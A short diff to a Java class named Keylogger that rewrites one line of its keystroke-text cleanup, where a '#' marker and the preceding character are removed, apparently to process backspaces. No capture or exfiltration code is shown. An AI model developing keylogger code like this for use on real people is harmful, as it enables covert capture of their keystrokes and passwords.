@@ -112,7 +112,7 @@ public class Keylogger {
         if (resultStr.contains("#")) {
             String removeStr = "#";
             if (resultStr.indexOf("#") > 0) {
-                removeStr = resultStr.substring(resultStr.indexOf("#") - 1, resultStr.indexOf("#")).concat("#");
+                removeStr = resultStr.substring(resultStr.indexOf("#") - 1, resultStr.indexOf("#") + 1);
             }
             resultStr = getResult3(resultStr.replaceFirst(removeStr, ""));
         }
